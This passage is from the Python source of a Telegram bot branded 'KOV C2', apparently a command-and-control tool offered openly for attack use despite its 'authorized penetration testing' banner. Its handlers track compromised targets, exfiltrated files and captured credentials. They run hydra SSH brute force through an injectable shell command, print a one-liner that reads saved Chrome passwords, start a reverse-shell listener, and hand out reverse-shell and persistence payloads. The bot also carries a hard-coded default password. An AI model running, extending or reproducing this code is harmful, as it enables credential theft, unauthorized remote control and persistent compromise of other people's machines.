        await update.message.reply_text("❌ nmap not installed. Install: `pkg install nmap` or `apt install nmap`", parse_mode=ParseMode.MARKDOWN)
    except Exception as e:
        await update.message.reply_text("❌ *Error:* `" + str(e) + "`", parse_mode=ParseMode.MARKDOWN)

async def osint(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('authenticated') and not is_admin(update.effective_user.id):
        await update.message.reply_text("🔒 Authenticate first with /login")
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /osint <target>")
        return
    target = context.args[0]
    await update.message.reply_text("🔍 *Gathering OSINT on " + target + "...*", parse_mode=ParseMode.MARKDOWN)
    results = []
    try:
        ip = socket.gethostbyname(target)
        results.append("  ├ IP: `" + ip + "`")
    except:
        pass
    for proto in ['https', 'http']:
        try:
            r = requests.get(proto + "://" + target, timeout=10, verify=False)
            h = dict(r.headers)
            results.append("  ├ " + proto.upper() + " Server: `" + h.get('Server', 'N/A') + "`")
            results.append("  ├ " + proto.upper() + " Tech: `" + h.get('X-Powered-By', 'N/A') + "`")
            break
        except:
            pass
    if not results:
        results.append("  └ No OSINT data found")
    msg = "🔍 *OSINT Results - " + target + "*\n━━━━━━━━━━━━━━━━\n" + "\n".join(results)
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

async def list_files(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('authenticated') and not is_admin(update.effective_user.id):
        await update.message.reply_text("🔒 Authenticate first with /login")
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /listfiles <target_id>")
        return
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT * FROM files WHERE target_id = ? ORDER BY exfiltrated_at DESC", (context.args[0],))
    files = c.fetchall()
    conn.close()
    if not files:
        await update.message.reply_text("📭 *No files for this target*", parse_mode=ParseMode.MARKDOWN)
        return
    msg = "📁 *Exfiltrated Files*\n━━━━━━━━━━━━━━━━\n"
    for f in files:
        size_str = str(f['size']/1024)[:4] + " KB" if f['size'] else "Unknown"
        msg += "\n📄 `" + f['filename'] + "`\n  ├ Size: " + size_str + "\n  └ Date: `" + f['exfiltrated_at'] + "`\n"
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

async def upload_file_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('authenticated') and not is_admin(update.effective_user.id):
        await update.message.reply_text("🔒 Authenticate first with /login")
        return ConversationHandler.END
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /upload <target_id>\nThen send the file")
        return ConversationHandler.END
    context.user_data['upload_target'] = context.args[0]
    await update.message.reply_text("📤 *Send the file to upload*", parse_mode=ParseMode.MARKDOWN)
    return FILE_UPLOAD

async def upload_file_receive(update: Update, context: ContextTypes.DEFAULT_TYPE):
    file = update.message.document or update.message.photo[-1] if update.message.photo else None
    if not file:
        await update.message.reply_text("❌ Send a file (document or photo)")
        return FILE_UPLOAD
    target_id = context.user_data.get('upload_target')
    if not target_id:
        await update.message.reply_text("❌ No target selected")
        return ConversationHandler.END
    file_obj = await file.get_file()
    save_path = Path.home() / "d4rk_exfil" / target_id
    save_path.mkdir(parents=True, exist_ok=True)
    filename = getattr(file, 'file_name', None) or "file_" + str(int(time.time()))
    local_file = save_path / filename
    await file_obj.download_to_drive(local_file)
    conn = get_db()
    c = conn.cursor()
    c.execute("INSERT INTO files (target_id, filename, filepath, size) VALUES (?, ?, ?, ?)", (target_id, filename, str(local_file), os.path.getsize(local_file)))
    conn.commit()
    conn.close()
    await update.message.reply_text("✅ *File saved:* `" + filename + "`\n📁 *Path:* `" + str(local_file) + "`", parse_mode=ParseMode.MARKDOWN)
    return ConversationHandler.END

async def keylogger(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('authenticated') and not is_admin(update.effective_user.id):
        await update.message.reply_text("🔒 Authenticate first with /login")
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /keylogger <target_id>")
        return
    await update.message.reply_text("⌨️ *Keylogger Simulated*\n(On real target: deploys keylogger via reverse shell)\nUse /cmd to execute on target.", parse_mode=ParseMode.MARKDOWN)

async def screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('authenticated') and not is_admin(update.effective_user.id):
        await update.message.reply_text("🔒 Authenticate first with /login")
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /screenshot <target_id>")
        return
    await update.message.reply_text("📸 *Taking screenshot...*", parse_mode=ParseMode.MARKDOWN)
    try:
        img_path = "/tmp/d4rk_ss_" + str(int(time.time())) + ".png"
        result = subprocess.run(["scrot", img_path], capture_output=True, timeout=10)
        if os.path.exists(img_path):
            with open(img_path, 'rb') as f:
                await update.message.reply_photo(photo=InputFile(f, filename="screenshot.png"), caption="📸 *Screenshot captured*", parse_mode=ParseMode.MARKDOWN)
            os.remove(img_path)
        else:
            await update.message.reply_text("❌ *Screenshot failed* - no display found.\nInstall: `pkg install scrot`", parse_mode=ParseMode.MARKDOWN)
    except:
        await update.message.reply_text("❌ *Screenshot not available*\nInstall: `pkg install scrot`", parse_mode=ParseMode.MARKDOWN)

async def persistence(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('authenticated') and not is_admin(update.effective_user.id):
        await update.message.reply_text("🔒 Authenticate first with /login")
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /persistence <target_id>")
        return
    await update.message.reply_text("🔗 *Persistence Script Generated*\n```\n" + generate_persistence_script() + "\n```\nReplace LHOST and LPORT before deploying.", parse_mode=ParseMode.MARKDOWN)

async def browserpass(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('authenticated') and not is_admin(update.effective_user.id):
        await update.message.reply_text("🔒 Authenticate first with /login")
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /browserpass <target_id>")
        return
    await update.message.reply_text("🔑 *Browser Password Extraction*\nTo extract from target, run via /cmd:\n\n*Chrome/Linux:*\n```\npython3 -c \"import sqlite3,os; p=os.path.expanduser('~/.config/google-chrome/Default/Login Data'); c=sqlite3.connect(p); for r in c.execute('SELECT origin_url,username_value,password_value FROM logins'): print(r)\"\n```\n*Firefox:*\n```\nls ~/.mozilla/firefox/*.default-release/logins.json\n```", parse_mode=ParseMode.MARKDOWN)

async def wifi_enum(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('authenticated') and not is_admin(update.effective_user.id):
        await update.message.reply_text("🔒 Authenticate first with /login")
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /wifi <target_id>")
        return
    await update.message.reply_text("📶 *Enumerating WiFi networks...*", parse_mode=ParseMode.MARKDOWN)
    try:
        result = subprocess.run(["nmcli", "dev", "wifi", "list"], capture_output=True, text=True, timeout=10)
        if result.returncode == 0:
            output = result.stdout[:3500]
        else:
            result = subprocess.run(["iwlist", "scan"], capture_output=True, text=True, timeout=10)
            output = result.stdout[:3500] if result.stdout else "No WiFi interfaces found"
    except:
        output = "WiFi enumeration requires nmcli or iwlist"
    await update.message.reply_text("📶 *WiFi Networks*\n```\n" + output + "\n```", parse_mode=ParseMode.MARKDOWN)

async def brute(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('authenticated') and not is_admin(update.effective_user.id):
        await update.message.reply_text("🔒 Authenticate first with /login")
        return
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /brute <target> <username> <wordlist_path>\nExample: /brute 192.168.1.1 root /usr/share/wordlists/rockyou.txt", parse_mode=ParseMode.MARKDOWN)
        return
    target_ip = context.args[0]
    username = context.args[1]
    wordlist = context.args[2] if len(context.args) > 2 else "/usr/share/wordlists/rockyou.txt"
    await update.message.reply_text("🔨 *Brute Force Attack*\nTarget: `" + target_ip + "`\nUsername: `" + username + "`\nWordlist: `" + wordlist + "`\n\n⚙️ Starting...\n*(Use hydra or medusa for real brute force)*", parse_mode=ParseMode.MARKDOWN)
    try:
        result = subprocess.run("hydra -l " + username + " -P " + wordlist + " ssh://" + target_ip + " -t 4 -V", shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout + result.stderr
        if len(output) > 3500:
            output = output[:3500] + "\n\n...[truncated]..."
        await update.message.reply_text("```\n" + output + "\n```", parse_mode=ParseMode.MARKDOWN)
    except FileNotFoundError:
        await update.message.reply_text("❌ hydra not installed.\nInstall: `pkg install hydra` or `apt install hydra`", parse_mode=ParseMode.MARKDOWN)
    except subprocess.TimeoutExpired:
        await update.message.reply_text("⏰ *Brute force timed out*", parse_mode=ParseMode.MARKDOWN)
    except Exception as e:
        await update.message.reply_text("❌ *Error:* `" + str(e) + "`", parse_mode=ParseMode.MARKDOWN)

async def listener(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('authenticated') and not is_admin(update.effective_user.id):
        await update.message.reply_text("🔒 Authenticate first with /login")
        return
    port = int(context.args[0]) if context.args else 4444
    if context.bot_data.get('listener_running'):
        await update.message.reply_text("🔴 *Listener already running on port " + str(context.bot_data.get('listener_port')) + "*\nUse /stoplistener to stop it.", parse_mode=ParseMode.MARKDOWN)
        return
    await update.message.reply_text("🎧 *Starting listener on port " + str(port) + "...*\nUse /payload to generate a reverse shell.", parse_mode=ParseMode.MARKDOWN)
    def start_listener():
        context.bot_data['listener_running'] = True
        context.bot_data['listener_port'] = port
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            server.bind(('0.0.0.0', port))
            server.listen(5)
            server.settimeout(1.0)
            while context.bot_data.get('listener_running'):
                try:
                    client, addr = server.accept()
                    t = threading.Thread(target=handle_connection, args=(client, addr, context))
                    t.daemon = True
                    t.start()
                except socket.timeout:
                    continue
                except:
                    break
        except Exception as e:
            print("[Listener Error] " + str(e))
        finally:
            server.close()
            context.bot_data['listener_running'] = False
    t = threading.Thread(target=start_listener, daemon=True)
    t.start()
    context.bot_data['listener_thread'] = t

def handle_connection(client, addr, context):
    print("[+] Connection from " + str(addr))
    client.send(b"KOV C2 Shell\n> ")
    try:
        while True:
            data = client.recv(4096)
            if not data:
                break
            output = data.decode('utf-8', errors='replace')
            print("[Shell Output] " + output)
    except:
        pass
    finally:
        client.close()
        print("[-] Connection closed: " + str(addr))

async def stop_listener(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('authenticated') and not is_admin(update.effective_user.id):
        await update.message.reply_text("🔒 Authenticate first with /login")
        return
    if context.bot_data.get('listener_running'):
        context.bot_data['listener_running'] = False
        await update.message.reply_text("⏹️ *Listener stopped*", parse_mode=ParseMode.MARKDOWN)
    else:
        await update.message.reply_text("📭 *No listener running*", parse_mode=ParseMode.MARKDOWN)

async def payload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('authenticated') and not is_admin(update.effective_user.id):
        await update.message.reply_text("🔒 Authenticate first with /login")
        return
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /payload <lhost> <lport> [os]\nOS options: linux (default), windows\nExample: /payload 192.168.1.100 4444 linux", parse_mode=ParseMode.MARKDOWN)
        return
    lhost = context.args[0]
    lport = int(context.args[1])
    os_type = context.args[2] if len(context.args) > 2 else "linux"
    shell_code = generate_reverse_shell(lhost, lport, os_type)
    await update.message.reply_text("💉 *Reverse Shell Payload*\nLHOST: `" + lhost + "`\nLPORT: `" + str(lport) + "`\nOS: `" + os_type + "`\n\n```\n" + shell_code + "\n```\n\n📋 Copy and execute on target.", parse_mode=ParseMode.MARKDOWN)

async def info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('authenticated') and not is_admin(update.effective_user.id):
        await update.message.reply_text("🔒 Authenticate first with /login")
        return
    s_info = get_system_info()
    msg = "━━━━━━━━━━━━━━━━━━━━━━\n🖥 *KOV C2 SYSTEM INFO*\n━━━━━━━━━━━━━━━━━━━━━━\n*Hostname:* `" + s_info['hostname'] + "`\n*OS:* `" + s_info['platform'] + " " + s_info['platform_release'] + "`\n*Arch:* `" + s_info['architecture'] + "`\n*IP:* `" + s_info['ip'] + "`\n*CPU:* `" + str(s_info['cpu_count']) + " cores`\n*RAM:* `" + s_info['memory'] + " (" + s_info['memory_used'] + ")`\n*Disk:* `" + s_info['disk'] + " (" + s_info['disk_used'] + ")`\n*Python:* `" + s_info['python_version'][:30] + "...`\n*Uptime:* `" + s_info['uptime'] + "`\n━━━━━━━━━━━━━━━━━━━━━━"
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('authenticated') and not is_admin(update.effective_user.id):
        await update.message.reply_text("🔒 Authenticate first with /login")
        return
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM targets WHERE status='active'")
    active_targets = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM targets")
    total_targets = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM sessions WHERE active=1")
    active_sessions = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM commands WHERE status='pending'")
    pending_cmds = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM files")
    total_files = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM credentials")
    total_creds = c.fetchone()[0]
    conn.close()
    listener_status = "🟢 Running" if context.bot_data.get('listener_running') else "🔴 Stopped"
    listener_port = context.bot_data.get('listener_port', 'N/A')
    msg = "━━━━━━━━━━━━━━━━━━━━━━\n📊 *KOV C2 STATUS*\n━━━━━━━━━━━━━━━━━━━━━━\n🎯 Active Targets: `" + str(active_targets) + "/" + str(total_targets) + "`\n💻 Active Sessions: `" + str(active_sessions) + "`\n⏳ Pending Commands: `" + str(pending_cmds) + "`\n📁 Exfiltrated Files: `" + str(total_files) + "`\n🔑 Captured Credentials: `" + str(total_creds) + "`\n🎧 Listener: " + listener_status + " (port " + str(listener_port) + ")\n━━━━━━━━━━━━━━━━━━━━━━"
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

async def cleanup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('authenticated') and not is_admin(update.effective_user.id):
        await update.message.reply_text("🔒 Authenticate first with /login")
        return
    conn = get_db()
    c = conn.cursor()
    c.execute("DELETE FROM commands WHERE executed_at < datetime('now', '-7 days')")
    c.execute("DELETE FROM files WHERE exfiltrated_at < datetime('now', '-7 days')")
    c.execute("DELETE FROM credentials WHERE captured_at < datetime('now', '-7 days')")
    conn.commit()
    conn.close()
    await update.message.reply_text("🧹 *Old data cleaned!* (Deleted entries older than 7 days)", parse_mode=ParseMode.MARKDOWN)

async def update_self(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('authenticated') and not is_admin(update.effective_user.id):
        await update.message.reply_text("🔒 Authenticate first with /login")
        return
    await update.message.reply_text("🔄 *KOV C2 is up to date* (local version)", parse_mode=ParseMode.MARKDOWN)

# admin input (add/remove/ban/unban)
ADMIN_ACTION = range(1)

async def admin_action_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await query.edit_message_text("❌ *Access Denied* - Owner only.", parse_mode=ParseMode.MARKDOWN)
        return ConversationHandler.END

    data = query.data
    action_map = {
        "admin_add": ("👥 *Add Admin*\n\nSend the Telegram user ID to add as admin:", "add"),
        "admin_remove": ("🗑 *Remove Admin*\n\nSend the Telegram user ID to remove from admins:", "remove"),
        "admin_ban": ("🚫 *Ban User*\n\nSend the Telegram user ID to ban:", "ban"),
        "admin_unban": ("✅ *Unban User*\n\nSend the Telegram user ID to unban:", "unban"),
    }

    if data in action_map:
        msg, action_type = action_map[data]
        context.user_data['admin_action_type'] = action_type
        await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_cancel_keyboard())
        return ADMIN_ACTION

    return ConversationHandler.END

async def admin_action_receive(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ *Access Denied*", parse_mode=ParseMode.MARKDOWN)
        return ConversationHandler.END

    action_type = context.user_data.get('admin_action_type')
    text = update.message.text.strip()

    try:
        target_id = int(text)
    except ValueError:
        await update.message.reply_text("❌ *Invalid ID.* Please send a numeric Telegram user ID.", parse_mode=ParseMode.MARKDOWN, reply_markup=build_cancel_keyboard())
        return ADMIN_ACTION

    if action_type == "add":
        if add_admin(target_id):
            await update.message.reply_text("✅ *Admin Added*\nUser ID: `" + str(target_id) + "`", parse_mode=ParseMode.MARKDOWN)
        else:
            await update.message.reply_text("ℹ️ User `" + str(target_id) + "` is already an admin.", parse_mode=ParseMode.MARKDOWN)

    elif action_type == "remove":
        if target_id == ADMIN_ID:
            await update.message.reply_text("❌ Cannot remove the owner.", parse_mode=ParseMode.MARKDOWN)
        elif remove_admin(target_id):
            await update.message.reply_text("✅ *Admin Removed*\nUser ID: `" + str(target_id) + "`", parse_mode=ParseMode.MARKDOWN)
        else:
            await update.message.reply_text("ℹ️ User `" + str(target_id) + "` is not an admin.", parse_mode=ParseMode.MARKDOWN)

    elif action_type == "ban":
        if target_id == ADMIN_ID or is_admin(target_id):
            await update.message.reply_text("❌ Cannot ban an admin.", parse_mode=ParseMode.MARKDOWN)
        elif ban_user(target_id):
            await update.message.reply_text("✅ *User Banned*\nUser ID: `" + str(target_id) + "`", parse_mode=ParseMode.MARKDOWN)
        else:
            await update.message.reply_text("ℹ️ User `" + str(target_id) + "` is already banned.", parse_mode=ParseMode.MARKDOWN)

    elif action_type == "unban":
        if unban_user(target_id):
            await update.message.reply_text("✅ *User Unbanned*\nUser ID: `" + str(target_id) + "`", parse_mode=ParseMode.MARKDOWN)
        else:
            await update.message.reply_text("ℹ️ User `" + str(target_id) + "` is not banned.", parse_mode=ParseMode.MARKDOWN)

    
    msg = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n        ⚙️ *ADMIN PANEL*\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\nManage administrators and bans:"
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_admin_menu())
    return ConversationHandler.END

async def admin_action_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    msg = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n        ⚙️ *ADMIN PANEL*\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\nManage administrators and bans:"
    if update.callback_query:
        await update.callback_query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_admin_menu())
    else:
        await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_admin_menu())
    return ConversationHandler.END


async def login_button_flow(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "🔐 *LOGIN*\n\nPlease send your password using:\n`/login <password>`\n\nDefault password: `d4rk123`\n\nUse `/setpass <new_password>` after login to change it.",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=build_start_keyboard()
    )


async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = update.effective_user.id

    
    if data == "start_login":
        await query.edit_message_text(
            "🔐 *LOGIN*\n\nPlease send your password using:\n`/login <password>`\n\nDefault password: `d4rk123`\n\nUse `/setpass <new_password>` after login to change it.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=build_start_keyboard()
        )
        return

    if data == "start_about":
        msg = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n      🔥 *KOV C2 SARVER* 🔥\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n*Version:* 3.0\n*Developer:* D4RK-K1NG\n*Platform:* " + platform.system() + " " + platform.release() + "\n\n*Features:*\n• Target Management\n• Interactive Shell\n• Port Scanning\n• Payload Generation\n• Keylogger\n• Screenshot Capture\n• Browser Password Extraction\n• WiFi Enumeration\n• Brute Force\n• File Operations\n• Multi-Admin Support\n• Ban/Unban System\n\n*For authorized penetration testing only*"
        await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_start_keyboard())
        return

    if data == "menu_logout":
        context.user_data['authenticated'] = False
        context.user_data['shell_target'] = None
        msg = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n      🔥 *KOV C2 SARVER* 🔥\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n*Developer:* D4RK-K1NG\n*User:* " + update.effective_user.full_name + "\n*ID:* `" + str(user_id) + "`\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n*Authorized Penetration Testing*\n*Advanced Command & Control*\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n🔐 *Please login to access the system*"
        await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_start_keyboard())
        return

    if not context.user_data.get('authenticated') and not is_admin(user_id):
        await query.edit_message_text("🔐 *Please login first*\nUse: /login <password>", parse_mode=ParseMode.MARKDOWN, reply_markup=build_start_keyboard())
        return

    context.user_data['authenticated'] = True

    if data == "menu_back":
        role = "👑 OWNER" if is_owner(user_id) else "🛡️ ADMIN"
        msg = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n          📋 *MAIN MENU*\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\nWelcome, " + update.effective_user.full_name + "\nRole: " + role + "\n\nSelect an option below:"
        await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_main_menu(is_owner(user_id)))
        return

    if data == "menu_admin":
        if not is_owner(user_id):
            await query.edit_message_text("❌ *Access Denied* - Owner only.", parse_mode=ParseMode.MARKDOWN)
            return
        msg = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n        ⚙️ *ADMIN PANEL*\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\nManage administrators and bans:"
        await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_admin_menu())
        return

    
    if data in ("admin_add", "admin_remove", "admin_ban", "admin_unban"):
        
        await query.edit_message_text(
            "⚙️ Please use the text commands or interact with the admin panel buttons again.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=build_admin_menu()
        )
        return

    if data == "admin_list_admins":
        admins = get_admins()
        msg = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n👥 *ADMINISTRATORS*\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        for aid in admins:
            tag = " 👑 OWNER" if aid == ADMIN_ID else ""
            msg += "  • `" + str(aid) + "`" + tag + "\n"
        msg += "\nTotal: `" + str(len(admins)) + "`"
        await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_admin_menu())
        return

    if data == "admin_ban_list":
        banned = get_banned()
        if not banned:
            await query.edit_message_text("✅ *No users are banned.*", parse_mode=ParseMode.MARKDOWN, reply_markup=build_admin_menu())
            return
        msg = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n🚫 *BANNED USERS*\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        for bid in banned:
            msg += "  • `" + str(bid) + "`\n"
        msg += "\nTotal: `" + str(len(banned)) + "`"
        await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_admin_menu())
        return

    if data == "admin_cancel":
        msg = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n        ⚙️ *ADMIN PANEL*\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\nManage administrators and bans:"
        await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_admin_menu())
        return

    if data == "menu_targets":
        conn = get_db()
        c = conn.cursor()
        c.execute("SELECT * FROM targets ORDER BY last_seen DESC")
        rows = c.fetchall()
        conn.close()
        if not rows:
            await query.edit_message_text("📭 *No targets registered.*\nUse /addtarget to add one.", parse_mode=ParseMode.MARKDOWN)
            return
        msg = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n🎯 *KOV C2 TARGETS*\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        for row in rows:
            status_icon = "🟢" if row['status'] == 'active' else "🔴"
            msg += "\n" + status_icon + " *ID:* `" + str(row['id']) + "`\n  ├ Hostname: `" + row['hostname'] + "`\n  ├ IP: `" + row['ip'] + "`\n  ├ OS: `" + (row['os'] or 'Unknown') + "`\n  └ Last Seen: `" + row['last_seen'] + "`\n"
        keyboard = []
        for row in rows[:10]:
            keyboard.append([InlineKeyboardButton("🎯 " + row['hostname'] + " (" + row['ip'] + ")", callback_data="target:" + str(row['id']))])
        keyboard.append([InlineKeyboardButton("🔙 MAIN MENU", callback_data="menu_back")])
        await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))
        return

    if data == "menu_shell":
        await query.edit_message_text("💻 *Shell Mode*\n\nUse: /shell <target_id>\nOr select a target from /targets", parse_mode=ParseMode.MARKDOWN, reply_markup=build_back_keyboard())
        return

    if data == "menu_scan":
        await query.edit_message_text("🔍 *Scanner*\n\nUse: /scan <target_id> [ports]\nOr: /nmap <target> [args]", parse_mode=ParseMode.MARKDOWN, reply_markup=build_back_keyboard())
        return

    if data == "menu_files":
        await query.edit_message_text("📁 *File Operations*\n\n/upload <target_id> - Upload file\n/listfiles <target_id> - List files", parse_mode=ParseMode.MARKDOWN, reply_markup=build_back_keyboard())
        return

    if data == "menu_payloads":
        await query.edit_message_text("💉 *Payload Generation*\n\nUse: /payload <lhost> <lport> [os]\nOS: linux (default), windows", parse_mode=ParseMode.MARKDOWN, reply_markup=build_back_keyboard())
        return

    if data == "menu_listener":
        await query.edit_message_text("🎧 *Listener*\n\n/listener <port> - Start listener\n/stoplistener - Stop listener", parse_mode=ParseMode.MARKDOWN, reply_markup=build_back_keyboard())
        return

    if data == "menu_info":
        s_info = get_system_info()
        msg = "━━━━━━━━━━━━━━━━━━━━━━\n🖥 *KOV C2 SYSTEM INFO*\n━━━━━━━━━━━━━━━━━━━━━━\n*Hostname:* `" + s_info['hostname'] + "`\n*OS:* `" + s_info['platform'] + " " + s_info['platform_release'] + "`\n*Arch:* `" + s_info['architecture'] + "`\n*IP:* `" + s_info['ip'] + "`\n*CPU:* `" + str(s_info['cpu_count']) + " cores`\n*RAM:* `" + s_info['memory'] + " (" + s_info['memory_used'] + ")`\n*Disk:* `" + s_info['disk'] + " (" + s_info['disk_used'] + ")`\n*Python:* `" + s_info['python_version'][:30] + "...`\n*Uptime:* `" + s_info['uptime'] + "`\n━━━━━━━━━━━━━━━━━━━━━━"
        await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_back_keyboard())
        return

    if data == "menu_status":
        conn = get_db()
        c = conn.cursor()
        c.execute("SELECT COUNT(*) FROM targets WHERE status='active'")
        active_targets = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM targets")
        total_targets = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM sessions WHERE active=1")
        active_sessions = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM commands WHERE status='pending'")
        pending_cmds = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM files")
        total_files = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM credentials")
        total_creds = c.fetchone()[0]
        conn.close()
        listener_status = "🟢 Running" if context.bot_data.get('listener_running') else "🔴 Stopped"
        listener_port = context.bot_data.get('listener_port', 'N/A')
        msg = "━━━━━━━━━━━━━━━━━━━━━━\n📊 *KOV C2 STATUS*\n━━━━━━━━━━━━━━━━━━━━━━\n🎯 Active Targets: `" + str(active_targets) + "/" + str(total_targets) + "`\n💻 Active Sessions: `" + str(active_sessions) + "`\n⏳ Pending Commands: `" + str(pending_cmds) + "`\n📁 Exfiltrated Files: `" + str(total_files) + "`\n🔑 Captured Credentials: `" + str(total_creds) + "`\n🎧 Listener: " + listener_status + " (port " + str(listener_port) + ")\n━━━━━━━━━━━━━━━━━━━━━━"
        await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=build_back_keyboard())
        return

    if data == "menu_postex":
        await query.edit_message_text("🧰 *Post-Exploitation*\n\n/keylogger <id> - Keylogger\n/screenshot <id> - Screenshot\n/persistence <id> - Persistence\n/browserpass <id> - Browser passwords\n/wifi <id> - WiFi enumeration", parse_mode=ParseMode.MARKDOWN, reply_markup=build_back_keyboard())
        return

    if data == "menu_brute":
        await query.edit_message_text("🔨 *Brute Force*\n\nUse: /brute <target> <username> <wordlist>", parse_mode=ParseMode.MARKDOWN, reply_markup=build_back_keyboard())
        return

    if data == "menu_help":
        help_text = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n     📖 *KOV C2 - COMMANDS*\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n*AUTHENTICATION*\n/login <pass> - Login\n/setpass <pass> - Change password\n/menu - Show main menu\n\n*TARGETS*\n/targets - List targets\n/addtarget <hostname> <ip> - Add target\n/removetarget <id> - Remove target\n\n*COMMANDS*\n/shell <id> - Interactive shell\n/cmd <id> <cmd> - Execute command\n/scan <id> [ports] - Port scan\n\n*FILES*\n/upload <id> - Upload file\n/listfiles <id> - List files\n\n*POST-EXPLOITATION*\n/screenshot <id> - Screenshot\n/persistence <id> - Persistence\n/browserpass <id> - Browser passwords\n/wifi <id> - WiFi enumeration\n\n*OTHER*\n/payload <host> <port> [os] - Payload\n/listener <port> - Start listener\n/info - System info\n/status - Bot status\n\n*DEVELOPER:* D4RK-K1NG"
